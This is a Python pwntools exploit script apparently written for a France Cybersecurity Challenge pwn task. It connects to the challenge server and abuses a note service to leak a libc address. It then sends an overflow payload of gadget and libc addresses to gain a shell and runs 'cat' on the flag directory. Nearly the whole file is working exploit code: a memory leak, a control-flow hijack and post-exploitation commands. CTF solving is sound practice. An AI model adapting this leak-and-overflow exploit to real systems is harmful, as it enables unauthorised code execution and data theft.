from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = ""
args = []
io: process = None

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """
    define current
    x/10xg (void*)a-0x10
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2108)

def launch_local():
    global file, io
    io = process([file, *args])
    debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)]

#
# exploit goes here
#

FLAG_ID = b"ChbbgHyPqJDQy5UaJve6uUGMDQHXWtc"

# exe = ELF(file)
# libc = ELF("./libc.so.6")

def exploit():
    leak = io.recvuntil(b"Choices:")
    SESSION = getb(leak, b"fcsc/", b"/\n")

    io.sendlineafter(b">>> ", b"1")
    leak = io.recvuntil(b"Content ")
    note = getb(leak, b"note: ", b"\n")

    io.sendlineafter(b"length: \n", b"176")
    io.sendlineafter(b"Content: \n", b"A"*8)

    io.sendlineafter(b">>> ", b"2")
    io.sendline(SESSION + b"/" + note)

    leak = io.recvuntil(b"Choices:")
    leak = getb(leak, b"[0x000000a0] ", b"  |")
    leak = bytes.fromhex(leak.decode())[-8:]
    libc_leak = u64(leak)

    print("libc: %#018x" % libc_leak)

    ptr1 = libc_leak + 0x16ee67
    ptr2 = libc_leak + 0x251d6

    io.sendlineafter(b">>> ", b"1")
    io.sendlineafter(b"length: \n", b"152")
    payload = flat([
        b"A"*0x68,
        0x40135b,
        0,
        0,
        0x40135e,
        ptr1,
        ptr2,
    ])
    io.sendlineafter(b"Content: \n", payload)

    io.sendline(b"cat /fcsc/ChbbgHyPqJDQy5UaJve6uUGMDQHXWtc/*")

    io.interactive()
    input("end")
    exit()

launch()
exploit()
